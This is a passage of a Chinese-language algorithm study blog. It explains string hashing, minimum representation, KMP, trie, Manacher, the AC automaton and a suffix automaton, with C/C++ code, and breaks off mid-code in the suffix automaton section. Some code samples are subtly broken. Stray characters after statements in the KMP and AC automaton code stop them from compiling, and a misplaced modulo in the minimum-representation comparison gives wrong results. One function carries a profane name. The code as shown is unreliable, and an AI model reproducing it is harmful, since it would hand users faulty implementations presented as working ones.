<h4 id="开放寻址法"><a href="#开放寻址法" class="headerlink" title="开放寻址法"></a><strong>开放寻址法</strong></h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">200003</span>, null = <span class="number">0x3f3f3f3f</span>;<span class="comment">//null是数据取不到的，开了两倍的坑位</span></span><br><span class="line"><span class="type">int</span> h[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;<span class="comment">//上厕所法，返回要存放的位置或者是他在的地方</span></span><br><span class="line">	<span class="type">int</span> k = (x % N + N) % N;   </span><br><span class="line">	<span class="keyword">while</span> (h[k] != null &amp;&amp; h[k] != x) &#123;</span><br><span class="line">		k++;</span><br><span class="line">		<span class="keyword">if</span> (k == N)k = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> k;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line">	<span class="built_in">memset</span>(h, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> h);<span class="comment">//memset是针对字节memset，h数组有四个字节，每个字节都是ox3f </span></span><br><span class="line">	<span class="keyword">while</span> (n--) &#123;</span><br><span class="line">		<span class="type">char</span> op[<span class="number">2</span>];</span><br><span class="line">		<span class="type">int</span> x;</span><br><span class="line">		cin &gt;&gt; op&gt;&gt;x;</span><br><span class="line">		<span class="type">int</span> k = <span class="built_in">find</span>(x);</span><br><span class="line">		<span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;I&#x27;</span>)h[k] = x;</span><br><span class="line">		<span class="keyword">else</span> &#123;<span class="keyword">if</span> (h[k] != null)cout &lt;&lt; <span class="string">&quot;yes&quot;</span> &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;No&quot;</span> &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="字符串哈希"><a href="#字符串哈希" class="headerlink" title="字符串哈希"></a>字符串哈希</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//思路:存放str，同时进行m次询问，利用前缀和预处理，进行p进制转换</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>,t=<span class="number">131</span>;<span class="comment">//将字母转化为t进制的数，将字符串的哈希值进行比较</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ull;<span class="comment">//用ull则溢出的话就认为是取模于2的64次方</span></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">char</span> str[N];</span><br><span class="line">ull h[N], p[N];</span><br><span class="line"><span class="function">ull <span class="title">get</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> h[r] - h[l - <span class="number">1</span>] * p[r - l + <span class="number">1</span>];<span class="comment">//求l和r之间字符串的哈希值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m &gt;&gt; str+<span class="number">1</span>;<span class="comment">//str+1表示第0位不放数据</span></span><br><span class="line">	p[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		p[i] = p[i - <span class="number">1</span>] * t;<span class="comment">//表示次方</span></span><br><span class="line">		h[i] = h[i - <span class="number">1</span>] * t + str[i];<span class="comment">//将他变为数字</span></span><br><span class="line">	<span class="comment">//	cout &lt;&lt; str[1] &lt;&lt; &quot; &quot; &lt;&lt; h[1];</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (m--) &#123;</span><br><span class="line">		<span class="type">int</span> l1, r1, l2, r2;</span><br><span class="line">		cin &gt;&gt; l1 &gt;&gt; r1 &gt;&gt; l2 &gt;&gt; r2;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">get</span>(l1, r1) == <span class="built_in">get</span>(l2, r2)) cout &lt;&lt; <span class="string">&quot;yes&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;No&quot;</span> &lt;&lt; endl;	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="最小表示法"><a href="#最小表示法" class="headerlink" title="最小表示法"></a>最小表示法</h2><p>在一个旋转字符串中，要确定其中字符串序列最小的字符串，最小表示法是挨个挨个比较。</p>
<p>每当两个相等的话就增加k，又不等的话就跳跃i或者j，遍历完后返回i和j中的min值。</p>
<p>例如这个字符串</p>
<p>d a b c</p>
<ol>
<li><table>
<thead>
<tr>
<th align="right">i&#x3D;0</th>
<th>j&#x3D;1</th>
<th>k&#x3D;0</th>
<th>a[0+0]&gt;a[1+0]</th>
</tr>
</thead>
<tbody><tr>
<td align="right">i&#x3D;i+k+1&#x3D;1,i++–&gt;2</td>
<td>j&#x3D;1</td>
<td>k&#x3D;0</td>
<td>a[2+0]&gt;a[1+0]</td>
</tr>
<tr>
<td align="right">i&#x3D;i+k+1&#x3D;3</td>
<td>j&#x3D;1</td>
<td>k&#x3D;0</td>
<td>a[3+0]&gt;a[1+0]</td>
</tr>
</tbody></table>
</li>
</ol>
<p>大致演示过程如上，此种方法的本质就是用双指针的来回跳跃来去除应多次重复的字符而造成的时间浪费，相较于kmp较为简单！</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//循环同构串</span></span><br><span class="line"><span class="comment">//最小表示法</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">3e5</span>+<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fuck</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">1</span>,k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;n&amp;&amp;j&lt;n&amp;&amp;k&lt;n)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[(i+k)%n]==a[j+k]%n)k++;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[(i+k)%n]&lt;a[(j+k)%n])</span><br><span class="line">            j+=k+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> i+=k+<span class="number">1</span>;</span><br><span class="line">            k=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i==j)i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> min(i,j);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">    ans=fuck();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a[(i+ans)%n]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="kmp算法"><a href="#kmp算法" class="headerlink" title="kmp算法"></a>kmp算法</h2><p>什么玩意?</p>
<p>KMP核心思路:模式串的字串内存在前后缀相同的字串,已知匹配的部分文本串和模式串相等,那么当出现不匹配的字符时,可以让模式串的指针j往回退,退到当前字串的最大公共前缀的位置,即退回到j&#x3D;ne[j],因为这一部分肯定是能匹配的,这样子遍历一整个字符串,j每次最多加一</p>
<p>所以就将时间复杂度降到了O(m+n)成功降低!</p>
<p>求KMP数组的过程就是将自己与自己匹配</p>
<p>例子:模版串:A B C A C A B C A B</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A B C A C A B C A B</span><br><span class="line">          A B C A C A B A A B</span><br></pre></td></tr></table></figure>

<p>ne[2]&#x3D;0<br>ne[3]&#x3D;0<br>ne[4]&#x3D;1<br>ne[5]&#x3D;0<br>ne[6]&#x3D;1<br>ne[7]&#x3D;2<br>ne[8]&#x3D;3<br>ne[9]&#x3D;4<br>j&#x3D;ne[j]&#x3D;1<br>ne[10]&#x3D;2</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//p是模板串,s是长文本</span></span><br><span class="line"><span class="type">char</span> p[N], s[M];</span><br><span class="line"><span class="type">int</span> ne[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; p + <span class="number">1</span> &gt;&gt; m &gt;&gt; s + <span class="number">1</span>;<span class="comment">//p+1是指从第一位开始存</span></span><br><span class="line">	<span class="comment">//求next的过程,模板串,即为自己匹配自己</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>, j = <span class="number">0</span>; i &lt;= n; i++) &#123;<span class="comment">//这里的ne[i]指的是前i项的最大公共前后缀长度</span></span><br><span class="line">		<span class="keyword">while</span> (j &amp;&amp; p[i] != p[j + <span class="number">1</span>])j = ne[j];<span class="comment">//一步一步地回退,回退到等价位置</span></span><br><span class="line">		<span class="keyword">if</span> (p[i] == p[j + <span class="number">1</span>])j++;</span><br><span class="line">		ne[i] = j;</span><br><span class="line">	&#125;i</span><br><span class="line">	<span class="comment">//kmp 匹配过程</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= m; i++) &#123;</span><br><span class="line">		<span class="keyword">while</span> (j &amp;&amp; s[i] != p[j + <span class="number">1</span>])j = ne[j];</span><br><span class="line">		<span class="keyword">if</span> (s[i] == p[j + <span class="number">1</span>])j++;</span><br><span class="line">		<span class="keyword">if</span> (j == n) &#123;</span><br><span class="line">			cout &lt;&lt; i - n&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">			j = ne[j];<span class="comment">//匹配成功</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;									</span><br></pre></td></tr></table></figure>

<h2 id="trie字典树"><a href="#trie字典树" class="headerlink" title="trie字典树"></a>trie字典树</h2><p>可以理解为通过字母建边，每一个新序列下的字母都有唯一的位序编号，用父子节点来看最清楚，son[p,c]&#x3D;u表示u是p通过c这条边得到的节点，即p是父节点，u是子节点。若是没有这条边就新建一条。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//高效存储和查询字符串集合的数据结构</span></span><br><span class="line"><span class="comment">//通过一颗多分枝的树来高效存储,每一个分支都是一个字符串</span></span><br><span class="line"><span class="type">int</span> son[N][<span class="number">26</span>],cnt[N],idx;<span class="comment">//下标是0的点,既是空节点,又是根节点</span></span><br><span class="line"><span class="type">char</span> str[N];<span class="comment">//输入字符串</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">char</span> str[])</span> </span>&#123;<span class="comment">//输入一整个字符串</span></span><br><span class="line">	<span class="type">int</span> p = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i]; i++) &#123;</span><br><span class="line">		<span class="type">int</span> u = str[i] - <span class="string">&#x27;a&#x27;</span>;<span class="comment">//将字符串转化成数字</span></span><br><span class="line">		<span class="keyword">if</span> (!son[p][u])son[p][u] = ++idx;<span class="comment">//idx储存的是当前用到的下标,下标唯一，往里面存储位置</span></span><br><span class="line">		p = son[p][u];</span><br><span class="line">	&#125;</span><br><span class="line">	cnt[p]++;<span class="comment">//p是标记，类似于终止标记</span></span><br><span class="line">	<span class="comment">//注意这里son[0][]存的是字符串的第一个字母，之后p会++，若该存的位置有被占用了，则会跳过，p自动继承，进行下一次循环</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">char</span> str[])</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> p = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i]; i++) &#123;</span><br><span class="line">		<span class="type">int</span> u = str[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span> (!son[p][u])<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		p = son[p][u];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> cnt[p];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	cin &gt;&gt; n;<span class="comment">//n为n次操作</span></span><br><span class="line">	<span class="keyword">while</span> (n--) &#123;</span><br><span class="line">		<span class="type">char</span> op[<span class="number">2</span>];</span><br><span class="line">		cin &gt;&gt; op;</span><br><span class="line">		cin &gt;&gt; str;</span><br><span class="line">		<span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;I&#x27;</span>)<span class="built_in">insert</span>(str);<span class="comment">//执行插入操作</span></span><br><span class="line">		<span class="keyword">else</span> cout &lt;&lt; <span class="built_in">query</span>(str);<span class="comment">//执行寻找操作</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Manacher"><a href="#Manacher" class="headerlink" title="Manacher"></a>Manacher</h2><p>&#x3D;&#x3D;复杂度O(n)&#x3D;&#x3D;</p>
<p>需要维持的值:</p>
<ul>
<li><p>一个原字符串a。</p>
</li>
<li><p>一个新的字符串S,构造方式为将原字符串的中间都插入一个’#’,在S[0]位置和S[n*2+2]的位置放两个完全不一样的字符表示边界条件</p>
</li>
<li><p>hw数组:hw[i]表示以i为回文字符串中心,hw[i]为左右辐射半径（包括自身这个点）的最大回文子字符串，故<code>hw[i]-1</code>的值就是原字符串回文字符子串长度。</p>
</li>
<li><p>maxright：maxright是第一个不匹配的项。</p>
</li>
<li><p>mid：对应已知最大maxright所属的回文字符串的中心。</p>
</li>
</ul>
<p>算法核心:对hw[i]的递归计算,设立几个变量,maxright为已知的最远端回文子字符串的第一个不匹配位,mid为maxright对应的字符串的中心.</p>
<p>遍历i,hw[i]的初始值都为1</p>
<p>有以下几种情况:</p>
<ul>
<li><p>i&lt;maxright:可以通过回文字符串对称性,hw[i]&gt;&#x3D;hw[(mid&lt;&lt;1)-i],之所以要这样是因为hw[i]有可能会扩展到超出maxright的范围,maxright之外是不已知的,要计算.</p>
</li>
<li><p>i&gt;&#x3D;maxright:需要一个一个找,中心扩展找回文子字符串,每次计算完一个点,要更新maxright的值和mid的值.</p>
</li>
</ul>
<p>举个例子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">位次：0 1 2 3 4 5 6 7 8 9 10 11</span><br><span class="line">S串  # # a # b # a # b # a</span><br><span class="line">hw值 0 1 2 1 4 1 6 1 4 1 2 1 0</span><br></pre></td></tr></table></figure>

<p>比如以s[4]作为mid的时候，maxright&#x3D;4+hw[4]&#x3D;4+4&#x3D;8</p>
<p>即maxright是第一个不匹配的项</p>
<p><code>hw[i]=min(hw[(mid&lt;&lt;1)-i],hw[mid]+mid-i);</code>这个关键语句可以参照上面的例子理解</p>
<p>以下是算法实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//manacher</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">2e7</span>;</span><br><span class="line"><span class="type">int</span> n,hw[N&lt;&lt;<span class="number">1</span>],ans;</span><br><span class="line"><span class="type">char</span> a[N],s[N&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    s[<span class="number">0</span>]=s[<span class="number">1</span>]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        s[i*<span class="number">2</span>+<span class="number">2</span>]=a[i];</span><br><span class="line">        s[i*<span class="number">2</span>+<span class="number">3</span>]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    n=n*<span class="number">2</span>+<span class="number">2</span>;</span><br><span class="line">    s[n]=<span class="number">0</span>;<span class="comment">//两边字符不一样就好了</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">manacher</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> maxright=<span class="number">0</span>,mid;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;maxright)</span><br><span class="line">        hw[i]=min(hw[(mid&lt;&lt;<span class="number">1</span>)-i],hw[mid]+mid-i);</span><br><span class="line">        <span class="comment">//hw[mid]+mid-i表示由中心点往外的最大辐射半径得到坐标-i</span></span><br><span class="line">        <span class="comment">//能够保证取到的hw[i]是正解hw[i]的一部分值,即他的子集</span></span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            hw[i]=<span class="number">1</span>;<span class="comment">//如果没有任何已知信息,则hw[i]=1</span></span><br><span class="line">        <span class="keyword">for</span>(;s[i+hw[i]]==s[i-hw[i]];++hw[i]);</span><br><span class="line">        <span class="keyword">if</span>(hw[i]+i&gt;maxright)&#123;</span><br><span class="line">            maxright=hw[i]+i;</span><br><span class="line">            mid=i;</span><br><span class="line">            &#125;       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,a);</span><br><span class="line">    n=<span class="built_in">strlen</span>(a);</span><br><span class="line">    init();</span><br><span class="line">    manacher();</span><br><span class="line">    ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    ans=max(ans,hw[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,ans<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="AC自动机"><a href="#AC自动机" class="headerlink" title="AC自动机"></a>AC自动机</h2><blockquote>
<p><a href="https://oi-wiki.org/string/ac-automaton/">经典链接</a></p>
</blockquote>
<p>AC自动机是kmp思想与tire树的一种结合。</p>
<p>kmp思想我们知道有个next数组，next数组存的是前后缀相等的最大长度，AC自动机重点是fail数组，</p>
<p>fail[i]什么意思呢？他表示以i这个点为尾节点的多个后缀所对应的在其他串中的最大前缀的坐标。即为当前坐标成立的情况下一定成立的坐标。</p>
<p>比如在图中1是8的fail指针，2是9的fail指针，若一个文本串能匹配到9这个坐标，则这个字符串一定能匹配2这个坐标。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202404051850290.png" alt="image-20240321212258449"></p>
<p>如何求fail？一层一层节点往下遍历求fail。</p>
<p>设我们知道所有父节点的fail，父节点为u，遍历所有子节点，设子节点为c，如果c存在的话，则让c的fail指针指向u的fail指针的同一条边的子节点。然后这个c压入队列中。 如果不存在，也指向u的fail指针的子节点，这是虚指针</p>
<p>简单版本代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">1e6</span>+<span class="number">10</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">tree</span>&#123;</span><br><span class="line">    <span class="type">int</span> fail;</span><br><span class="line">    <span class="type">int</span> vis[<span class="number">26</span>];</span><br><span class="line">    <span class="type">int</span> end;</span><br><span class="line">&#125; AC[N];</span><br><span class="line"><span class="type">int</span> cnt=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> len=s.<span class="built_in">length</span>();</span><br><span class="line">    <span class="type">int</span> now=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;s[i];i++)&#123;</span><br><span class="line">        <span class="type">int</span> t=AC[now].vis[s[i]-<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!t)AC[now].vis[s[i]-<span class="string">&#x27;a&#x27;</span>]=++cnt;</span><br><span class="line">        now=AC[now].vis[s[i]-<span class="string">&#x27;a&#x27;</span>];a</span><br><span class="line">    &#125;</span><br><span class="line">    AC[now].end++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_fail</span><span class="params">()</span></span>&#123;</span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; Q;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line">        <span class="type">int</span> c=AC[<span class="number">0</span>].vis[i];</span><br><span class="line">        <span class="keyword">if</span>(c)&#123;</span><br><span class="line">            AC[c].fail=<span class="number">0</span>;</span><br><span class="line">            Q.<span class="built_in">push</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!Q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="type">int</span> u=Q.<span class="built_in">front</span>();</span><br><span class="line">        Q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line">            <span class="type">int</span> c=AC[u].vis[i];</span><br><span class="line">            <span class="keyword">if</span>(!c)&#123;</span><br><span class="line">                AC[u].vis[i]=AC[AC[u].fail].vis[i];<span class="comment">//虚指针,起到路径压缩的作用</span></span><br><span class="line">              <span class="comment">//这样就不用在找fail指针的时候一层一层的往上回溯。优化</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> j=AC[u].fail;</span><br><span class="line">            AC[c].fail=AC[j].vis[i];<span class="comment">//由于虚指针的存在，不用往上寻找</span></span><br><span class="line">            Q.<span class="built_in">push</span>(c);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> len=s.<span class="built_in">length</span>();</span><br><span class="line">    <span class="type">int</span> now=<span class="number">0</span>,ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;s[i];i++)&#123;</span><br><span class="line">        now =AC[now].vis[s[i]-<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> t=now;t&amp;&amp;AC[t].end!=<span class="number">-1</span>;t=AC[t].fail)&#123;</span><br><span class="line">            ans+=AC[t].end;</span><br><span class="line">            AC[t].end=<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    string s;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;s;</span><br><span class="line">        <span class="built_in">build</span>(s);</span><br><span class="line">    &#125;</span><br><span class="line">    AC[<span class="number">0</span>].fail=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">get_fail</span>();</span><br><span class="line">    cin&gt;&gt;s;</span><br><span class="line">    cout&lt;&lt;<span class="built_in">query</span>(s)&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="SAM"><a href="#SAM" class="headerlink" title="SAM"></a>SAM</h2><p>&#x3D;&#x3D;时间复杂度O(n)&#x3D;&#x3D;</p>
<p>主要功能：在O(n)的复杂度内存取一个字符串的所有字串信息</p>
<p>解决的典型问题：</p>
<ol>
<li>统计一个字符串中不同字符的数量</li>
<li></li>
</ol>
<p>重要概念：</p>
<p>结束位置<code>endpos</code>;后缀链接<code>links</code>，links指向的等价类表示</p>
<p>每个节点是表示一个等价类，等价类中的串是所有endpos一样的串的集合，等价类中存储的信息有最长串的长度，父节点（link指向的节点），一坨子节（可以用<code>map/数组</code>表示).</p>
<p><a href="https://www.luogu.com.cn/problem/P3804">板子题目1</a></p>
<p><a href="https://www.luogu.com.cn/problem/P2408">板子题目2</a></p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">2000010</span>;</span><br><span class="line"><span class="type">int</span> tot = <span class="number">1</span>, last = <span class="number">1</span>,e[N], ne[N], h[N], idx;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> len, fa;<span class="comment">//len存的是最大串长度，fa存的是link指向的串</span></span><br><span class="line">    <span class="type">int</span> ch[<span class="number">26</span>];</span><br><span class="line">&#125; node[N];</span><br><span class="line"><span class="type">char</span> str[N];</span><br><span class="line">ll f[N], ans;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">extend</span><span class="params">(<span class="type">int</span> c)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> p = last, np = last = ++tot;</span><br><span class="line">    node[np].len = node[p].len + <span class="number">1</span>;</span><br><span class="line">    f[tot] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (; p &amp;&amp; !node[p].ch[c]; p = node[p].fa)</span><br><span class="line">        node[p].ch[c] = np;</span><br><span class="line">    <span class="keyword">if</span> (!p)</span><br><span class="line">        node[np].fa = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> q = node[p].ch[c];</span><br><span class="line">        <span class="keyword">if</span> (node[q].len == node[p].len + <span class="number">1</span>)</span><br><span class="line">            node[np].fa = q;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="type">int</span> copy = ++tot;</span><br><span class="line">            node[copy] = node[q];</span><br><span class="line">            node[copy].len = node[p].len + <span class="number">1</span>;</span><br><span class="line">            node[np].fa = node[q].fa = copy; <span class="comment">// 父节点重定向</span></span><br><span class="line">            <span class="keyword">for</span> (; p &amp;&amp; node[p].ch[c] == q; p = node[p].fa)</span><br><span class="line">                node[p].ch[c] = copy; <span class="comment">// 边重定向</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 